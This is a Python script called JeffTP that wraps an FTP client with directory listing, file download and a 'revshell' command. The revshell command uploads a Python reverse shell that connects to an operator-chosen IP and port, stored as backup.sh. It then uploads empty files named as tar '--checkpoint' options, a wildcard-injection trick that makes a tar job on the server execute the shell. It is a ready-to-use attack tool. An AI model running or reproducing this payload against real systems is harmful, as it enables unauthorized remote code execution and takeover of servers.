#!/usr/bin/env python3

# Created by: Ac1d
# Date: 10/01/2021
# Application details: JeffTP.py is an application I made ot make file extraction  and revershell techniques easier
# Usage: ./jeffTP.py -i IPADDRESS -u "USERNAME:PASSWORD"
# Github: https://github.com/AssassinUKG


from ftplib import FTP
from ftplib import error_perm
import io
import sys
import argparse

par = argparse.ArgumentParser()
par.add_argument("-i", "--ip",help="Enter the host IP", required=True)
par.add_argument("-p", "--port",help="Enter the Port", default=21, required=False)
par.add_argument("-u", "--user-pass", help="Enter 'Username:Password'", required=False)
args = par.parse_args()
options = vars(args)

HOST = args.ip
if args.port:
    PORT = args.port
else:
    PORT=21
if args.user_pass:
    u, p = args.user_pass.split(":")
    USERNAME= u
    PASSWORD= p
else:
    USERNAME = "anonymous"
    PASSWORD = ""
#print(options)

def banner():
    return (r"""
     ____.       _____  __________________________ 
    |    | _____/ ____\/ ____\__    ___/\______   \
    |    |/ __ \    __\   __\  |    |    |     ___/
/\__|    \  ___/|  |   |  |    |    |    |    |    
\________|\___  |__|   |__|    |____|    |____|    
              \/                                   
    """)
    

def help():
    print("")
    print("help     - help menu")
    print("cd       - change directory")
    print("ls       - list files")
    print("dlfile   - downlaod file")
    #print("dldir  - download directory")
    print("revshell - Reverse shell IP:PORT")
    print("pasv     - Set PASV mode")
    print("exit     - exit app")
    

class col:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    

def DownloadFile(ftp, filetoget):
    dirlisting = []
    ftp.dir(dirlisting.append)
    #exists = False
    filename = ""
    for line in dirlisting:
        filename = line.split(" ")[-1]
        if filetoget in line:
            #exists = True
            lf = open(filename, "wb")
            ftp.retrbinary("RETR " + filename, lf.write, 2048)
            lf.close()
            return True
        return False


print(col.CYAN + banner() + col.RESET + "\n")

ftp = FTP(timeout=10)
ftp.connect(HOST, PORT)

print(f"Loggin in with username: {USERNAME}, pass: {PASSWORD}", )

try:
    ftp.login(user=USERNAME, passwd=PASSWORD)
except Exception as e:
    print("Could not login")

print(ftp.getwelcome())
#ftp.set_pasv(False)
#ftp.dir()

while True:
    cmd = input(col.GREEN + "JeffTP$ " + col.RESET)
    # Exit
    print(f"cmd: {cmd}")
    if cmd[0:4] == "exit":
        ftp.quit()
        sys.exit(0)
    # Help menu
    if cmd[:4] == "help":
        help()
        cmd = ""

    #Change Dir
    if cmd[0:3] == "cd ":
       
        try:
            print(f"Current Dir: {ftp.pwd()}")
            ftp.cwd(cmd.split(" ")[1])
            print(f"New Dir: {ftp.pwd()}")
            cmd = ""
        except:
            print("ERROR: Couldn't change dir")
            cmd = ""
    #List Dir
    if cmd[0:2] == "ls":
        dirlisting = []
        ftp.dir(dirlisting.append)
        if len(dirlisting) < 1:
            print("No files in Directory")
            cmd =""
        else:
            for line in dirlisting:
                print(line)
            cmd = ""

    # DownloadFile
    if cmd[0:6] == "dlfile":
        cmd =""
        try:
            print(ftp.retrlines('LIST'))
            filetoget = input("Filename: ")
            # Check file exists
            if DownloadFile(ftp, filetoget):
                print(f"File Downloaded: {filetoget}")
            else:
                print(f"File {filetoget} not found!")   
        except:
            print("Error in Download")    
    #List Dir  (NOT IMPLEMENTED YET)     
    # if cmd[0:5] == "dldir":
    #     print("get file")
    #     cmd = ""

    if cmd[0:4].lower() == "pasv":
        #ftp.set_pasv(False)
        cmd = "passive"
    
    if cmd[0:8] == "revshell":
        ip_port = input(col.GREEN + "Enter Reverse IP:PORT $ " + col.RESET)
        str_payload ='python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''.replace("<IP>", ip_port.split(":")[0]).replace("<PORT>", ip_port.split(":")[1])
        payload = io.BytesIO(str_payload.encode("ascii"))
        empty = io.BytesIO(b'')
        ftp.storlines('STOR backup.sh', payload)
        ftp.storlines('STOR --checkpoint=1', empty)
        ftp.storlines('STOR --checkpoint-action=exec=sh backup.sh', empty)
        cmd = ""
        print(col.GREEN + "Payload Saved!" + col.RESET)

    if cmd:
        try:           
            print(ftp.sendcmd(cmd))
        except error_perm as e:
            if "500 Unknown command." in e.args:
                print(col.RED + "Error: Command not found on server" + col.RESET)

    


